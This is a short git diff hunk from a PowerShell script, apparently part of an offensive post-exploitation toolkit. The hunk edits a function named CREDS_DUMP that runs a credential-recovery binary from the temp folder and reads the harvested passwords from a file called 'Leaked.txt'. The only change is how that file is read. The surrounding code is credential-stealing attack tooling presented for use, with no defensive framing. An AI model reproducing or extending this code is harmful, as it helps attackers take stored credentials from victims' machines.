@@ -862,7 +862,7 @@ function CREDS_DUMP {
         cd $env:tmp;./DarkRCovery.exe
         Start-Sleep -Seconds 8 # Wait for DarkRCovery to finish ..
         If(Test-Path "$env:tmp\Leaked.txt"){
-            $StoreCreds = Get-Content "$env:tmp\Leaked.txt" -Raw -ErrorAction SilentlyContinue
+            $StoreCreds = Get-Content "$env:tmp\Leaked.txt" -ErrorAction SilentlyContinue
             ## Check powershell version to parse data
             $PSVersion = $PSVersionTable.PSVersion.Major
             If($PSVersion -gt '4'){
